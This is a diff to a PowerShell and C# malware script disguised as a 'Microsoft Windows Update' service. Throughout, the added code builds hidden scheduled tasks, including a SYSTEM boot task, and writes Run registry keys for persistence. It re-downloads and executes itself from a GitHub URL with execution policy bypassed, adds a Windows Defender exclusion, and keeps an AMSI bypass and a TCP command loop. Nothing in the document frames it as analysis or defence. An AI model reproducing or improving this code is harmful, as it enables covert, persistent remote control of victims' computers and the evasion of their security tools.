@@ -11,6 +11,122 @@ $taskName    = "MicrosoftWindowsUpdateService_$h"
 $mutexName   = "Global\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
+function Get-InteractiveUser {
+    try {
+        $e = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -EA Stop | Select -First 1
+        if ($e) {
+            $o = Invoke-CimMethod -InputObject $e -MethodName GetOwner -EA Stop
+            if ($o -and $o.User) {
+                $sid = (New-Object Security.Principal.NTAccount($o.Domain, $o.User)).Translate([Security.Principal.SecurityIdentifier]).Value
+                return [pscustomobject]@{ Found = $true; Name = $o.User; Domain = $o.Domain; Sid = $sid }
+            }
+        }
+    } catch {}
+    $id = [Security.Principal.WindowsIdentity]::GetCurrent(); $p = $id.Name.Split('\')
+    return [pscustomobject]@{ Found = $false; Name = $p[-1]; Domain = $p[0]; Sid = $id.User.Value }
+}
+
+function New-TaskXml {
+    param([string]$Desc,[string]$Cmd,[string]$Args,[string]$Sid,[switch]$Boot)
+    $a = [Security.SecurityElement]::Escape($Args)
+    if ($Boot) {
+        $principal = '<UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel>'
+        $triggers  = '<BootTrigger><Enabled>true</Enabled><Delay>PT20S</Delay></BootTrigger>'
+    } else {
+        $principal = "<UserId>$Sid</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel>"
+        $start     = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ss')
+        $triggers  = "<LogonTrigger><Enabled>true</Enabled><UserId>$Sid</UserId></LogonTrigger>" +
+                     "<TimeTrigger><StartBoundary>$start</StartBoundary><Repetition><Interval>PT2M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition><Enabled>true</Enabled></TimeTrigger>"
+    }
+    @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo><Description>$Desc</Description></RegistrationInfo>
+  <Triggers>$triggers</Triggers>
+  <Principals><Principal id="Author">$principal</Principal></Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled><Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author"><Exec><Command>$Cmd</Command><Arguments>$a</Arguments></Exec></Actions>
+</Task>
+"@
+}
+
+function Install-Task {
+    param([string]$Name,[string]$Xml,[string]$Dir)
+    $t = Join-Path $Dir ("t_" + [guid]::NewGuid().ToString("N") + ".xml")
+    [IO.File]::WriteAllText($t, $Xml, [Text.Encoding]::Unicode)
+    $p = Start-Process schtasks.exe -ArgumentList "/create /tn `"$Name`" /xml `"$t`" /f" -WindowStyle Hidden -Wait -PassThru
+    Remove-Item $t -Force -EA 0
+    return ($p.ExitCode -eq 0)
+}
+
+function Repair-Installation {
+    param([switch]$Trigger)
+    $EAP = 'SilentlyContinue'
+    $base = "$env:ProgramData\Microsoft\Windows\Caches"
+    $sys  = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
+    $u    = Get-InteractiveUser
+    $canUser = (-not $sys) -or $u.Found
+
+    $dirs = @(Get-ChildItem $base -Directory -EA 0 | ? { $_.Name -match '^[0-9a-f]{8}$' -and (Test-Path (Join-Path $_.FullName '.r9k')) })
+    if (-not $dirs) {
+        $d = Join-Path $base $h
+        New-Item -ItemType Directory -Path $d -Force | Out-Null
+        Set-Content (Join-Path $d '.r9k') $h -Force
+        $dirs = @(Get-Item $d)
+    }
+
+    foreach ($d in $dirs) {
+        $leaf   = $d.Name
+        $dir    = $d.FullName
+        $script = Join-Path $dir "WinUpdateSvc_$leaf.ps1"
+        $taskU  = "MicrosoftWindowsUpdateService_$leaf"
+        $taskB  = "MicrosoftWindowsUpdateBoot_$leaf"
+        $runKey = "WinUpdateSvc_$leaf"
+
+        if ((-not (Test-Path $script)) -or ((Get-Item $script).Length -lt 1024)) {
+            try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                  (New-Object Net.WebClient).DownloadFile($myUrl, $script) } catch {}
+        }
+        if (Test-Path $script) { try { (Get-Item $script).Attributes = 'Hidden,System,ReadOnly' } catch {} }
+
+        $vbs = Join-Path $dir "WinUpdateSvc_$leaf.vbs"
+        if (Test-Path $vbs) { try { (Get-Item $vbs).Attributes='Normal'; Remove-Item $vbs -Force } catch {} }
+        if ($u.Found) {
+            try { $sf = (Get-ItemProperty "Registry::HKEY_USERS\$($u.Sid)\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" -Name Startup).Startup
+                  $sv = Join-Path $sf "WinUpdateSvc_$leaf.vbs"
+                  if (Test-Path $sv) { (Get-Item $sv).Attributes='Normal'; Remove-Item $sv -Force } } catch {}
+        }
+        schtasks /delete /tn "\Microsoft\Windows\Application Experience\MicrosoftCompatibilityAppraiser_$leaf" /f 2>$null | Out-Null
+
+        if ($canUser) {
+            $aU = "-nop -w hidden -ep bypass -f `"$script`" -silent"
+            Install-Task $taskU (New-TaskXml "Microsoft Windows Update" "powershell.exe" $aU $u.Sid) $dir | Out-Null
+
+            $cmd = "powershell.exe -nop -w hidden -ep bypass -f `"$script`" -silent"
+            try { Set-ItemProperty "Registry::HKEY_USERS\$($u.Sid)\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $runKey -Value $cmd -Force } catch {}
+            try { Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $runKey -Value $cmd -Force } catch {}
+        }
+
+        $inner = "`$p='$script';if(-not(Test-Path `$p)){`$d=Split-Path `$p;md `$d -Force|Out-Null;try{(New-Object Net.WebClient).DownloadFile('$myUrl',`$p)}catch{}};if(Test-Path `$p){& `$p -silent -repair -Trigger}"
+        Install-Task $taskB (New-TaskXml "Microsoft Windows Update Boot" "powershell.exe" "-nop -w hidden -ep bypass -c `"$inner`"" "" -Boot) $dir | Out-Null
+
+        try { Add-MpPreference -ExclusionPath $dir -Force } catch {}
+        if ($Trigger -and $canUser) { schtasks /run /tn $taskU 2>$null | Out-Null }
+    }
+}
+
+if ($args -contains '-repair') { Repair-Installation -Trigger:($args -contains '-Trigger'); exit }
+
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
@@ -19,7 +135,6 @@ if (-not $isAdmin) {
 
 $dir        = "$env:ProgramData\Microsoft\Windows\Caches\$h"
 $scriptPath = "$dir\$installName.ps1"
-$vbsPath    = "$dir\$installName.vbs"
 
 if ($args -notcontains "-silent") {
     $defenderOff = $false
@@ -53,55 +168,23 @@ if ($args -notcontains "-silent") {
     }
 
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-Content (Join-Path $dir '.r9k') $h -Force
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
-    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
-    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
+    Repair-Installation -Trigger
 
-    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
-    try {
-        Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $startup = [Environment]::GetFolderPath('Startup')
-        Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $interval = if ($defenderOff) { 3 } else { 1 }
-        $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
-        $xmlUser = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Description>Microsoft Windows Update</Description></RegistrationInfo>
-  <Triggers>
-    <LogonTrigger><Enabled>true</Enabled><UserId>$env:USERNAME</UserId></LogonTrigger>
-    <TimeTrigger><StartBoundary>$startTime</StartBoundary>
-      <Repetition><Interval>PT${interval}M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
-      <Enabled>true</Enabled>
-    </TimeTrigger>
-  </Triggers>
-  <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled></Settings>
-  <Actions Context="Author"><Exec><Command>wscript.exe</Command><Arguments>//B //Nologo "$vbsPath"</Arguments></Exec></Actions>
-</Task>
-"@
-        $p1 = "$dir\tu_$h.xml"; Set-Content -Path $p1 -Value $xmlUser -Encoding Unicode -Force
-        cmd /c "schtasks /create /tn `"$taskName`" /xml `"$p1`" /f" 2>$null
-        Remove-Item $p1 -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    attrib +h +s +r $scriptPath 2>$null
-    attrib +h +s +r $vbsPath 2>$null
-
-    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
-    exit
+    $ok = $false
+    try { schtasks /query /tn "MicrosoftWindowsUpdateService_$h" 2>$null | Out-Null; $ok = ($LASTEXITCODE -eq 0) } catch {}
+    if ($ok) { exit }
 }
 
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
+
+$stamp = Join-Path $dir '.repair'
+$need  = $true
+if (Test-Path $stamp) { if (((Get-Date) - (Get-Item $stamp).LastWriteTime).TotalMinutes -lt 5) { $need = $false } }
+if ($need) { Repair-Installation; Set-Content $stamp (Get-Date).ToString('o') -Force }
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
@@ -322,84 +405,28 @@ if (-not ("R9KAgent" -as [type])) {
             string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
             while (true) {
                 try {
-                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                     foreach (string sub in Directory.GetDirectories(dir)) {
-                        string leaf = sub.Substring(sub.Length - 8);
+                        string leaf = Path.GetFileName(sub);
+                        if (leaf.Length != 8) continue;
+                        bool hex = true;
+                        foreach (char ch in leaf) if (!Uri.IsHexDigit(ch)) { hex = false; break; }
+                        if (!hex) continue;
+                        if (!File.Exists(Path.Combine(sub, ".r9k"))) continue;
                         string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
-                        string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
-                        string bootPath = Path.Combine(sub, "boot_launcher.ps1");
                         if (!File.Exists(scriptPath)) {
-                            string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
-                            try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
+                            try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile("https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1", scriptPath); } } catch {}
                             try { File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
                         }
-                        if (!File.Exists(vbsPath)) {
-                            string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
-                            try { File.WriteAllText(vbsPath, vbs); } catch {}
-                            try { File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
-                        }
-                        if (!File.Exists(bootPath)) {
-                            string b = "$userTask = \"MicrosoftWindowsUpdateService_" + leaf + "\"\nwhile ($true) { try { $a = (query session 2>$null | Select-String \"Active\"); if ($a) { schtasks /run /tn $userTask 2>$null | Out-Null } } catch {}; Start-Sleep -Seconds 30 }";
-                            try { File.WriteAllText(bootPath, b); } catch {}
-                            try { File.SetAttributes(bootPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
-                        }
-                        string tUser = "MicrosoftWindowsUpdateService_" + leaf;
-                        string tBoot = "MicrosoftWindowsUpdateBoot_" + leaf;
-                        string tShadow = "\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf;
-                        if (!TaskExists(tUser)) { CreateTaskFromXml(tUser, TaskXml(scriptPath, vbsPath, false), sub); }
-                        if (!TaskExists(tBoot)) { CreateTaskFromXml(tBoot, TaskXml(scriptPath, bootPath, true), sub); }
-                        if (!TaskExists(tShadow)) { CreateTaskFromXml(tShadow, TaskXml(scriptPath, vbsPath, false), sub); }
-                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
-                        }
-                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
-                        }
+                        try {
+                            var psi = new ProcessStartInfo("powershell.exe",
+                                "-nop -w hidden -ep bypass -f \"" + scriptPath + "\" -repair -Trigger") { UseShellExecute = false, CreateNoWindow = true };
+                            var p = Process.Start(psi);
+                            if (p != null) p.WaitForExit(15000);
+                        } catch {}
                     }
                 } catch {}
-                Thread.Sleep(30000);
+                Thread.Sleep(120000);
             }
-        }
-
-        static bool TaskExists(string name) {
-            try {
-                var p = Process.Start(new ProcessStartInfo("schtasks", "/query /tn \"" + name + "\"") { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true });
-                p.WaitForExit(5000);
-                return p.ExitCode == 0;
-            } catch { return false; }
-        }
-
-        static string TaskXml(string scriptPath, string execPath, bool boot) {
-            string principal = boot ? "<UserId>S-1-5-18</UserId>" : "<UserId>" + Environment.UserName + "</UserId><LogonType>InteractiveToken</LogonType>";
-            string triggers = boot
-                ? "<BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger>"
-                : "<LogonTrigger><Enabled>true</Enabled><UserId>" + Environment.UserName + "</UserId></LogonTrigger>" +
-                  "<TimeTrigger><StartBoundary>" + DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss") + "</StartBoundary>" +
-                  "<Repetition><Interval>PT1M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></TimeTrigger>";
-            string cmd = boot ? "powershell.exe" : "wscript.exe";
-            string args = boot ? "-nop -w hidden -ep bypass -f \"" + execPath + "\"" : "//B //Nologo \"" + execPath + "\"";
-            return "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
-                "<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
-                "<RegistrationInfo><Description>Microsoft Windows Update</Description></RegistrationInfo>" +
-                "<Triggers>" + triggers + "</Triggers>" +
-                "<Principals><Principal id=\"Author\">" + principal + "<RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
-                "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
-                "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
-                "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
-                "<StartWhenAvailable>true</StartWhenAvailable>" +
-                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled></Settings>" +
-                "<Actions Context=\"Author\"><Exec><Command>" + cmd + "</Command><Arguments>" + args + "</Arguments></Exec></Actions></Task>";
-        }
-
-        static void CreateTaskFromXml(string name, string xml, string dir) {
-            try {
-                string safe = name.Replace('\\', '_');
-                string path = Path.Combine(dir, "restore_" + safe + ".xml");
-                File.WriteAllText(path, xml, Encoding.Unicode);
-                var p = Process.Start(new ProcessStartInfo("schtasks", "/create /tn \"" + name + "\" /xml \"" + path + "\" /f") { UseShellExecute = false, CreateNoWindow = true });
-                p.WaitForExit(10000);
-                try { File.Delete(path); } catch {}
-            } catch {}
         }
 
         static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
@@ -639,14 +666,18 @@ if (-not ("R9KAgent" -as [type])) {
                         string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
                         if (Directory.Exists(dir)) {
                             foreach (string sub in Directory.GetDirectories(dir)) {
-                                string leaf = sub.Substring(sub.Length - 8);
+                                string leaf = Path.GetFileName(sub);
+                                if (leaf.Length != 8) continue;
                                 string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
-                                string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
                                 string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                                 try { if (File.Exists(scriptPath)) File.SetAttributes(scriptPath, FileAttributes.Normal); } catch {}
                                 try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
                                 try { File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
-                                try { Process.Start("wscript.exe", "//B //Nologo \"" + vbsPath + "\""); } catch {}
+                                try {
+                                    var psi = new ProcessStartInfo("powershell.exe",
+                                        "-nop -w hidden -ep bypass -f \"" + scriptPath + "\" -silent") { UseShellExecute = false, CreateNoWindow = true };
+                                    Process.Start(psi);
+                                } catch {}
                             }
                         }
                     } catch {}
@@ -694,11 +725,13 @@ if (-not ("R9KAgent" -as [type])) {
                     try {
                         string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
                         foreach (string sub in Directory.GetDirectories(dir)) {
-                            string leaf = sub.Substring(sub.Length - 8);
+                            string leaf = Path.GetFileName(sub);
+                            if (leaf.Length != 8) continue;
                             string runName = "WinUpdateSvc_" + leaf;
                             try { using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
                             try { using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
                             try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService_" + leaf + " /f").WaitForExit(); } catch {}
+                            try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateBoot_" + leaf + " /f").WaitForExit(); } catch {}
                             try { Process.Start("schtasks", "/delete /tn \"\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf + "\" /f").WaitForExit(); } catch {}
                             string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                             string sv = Path.Combine(startup, runName + ".vbs");
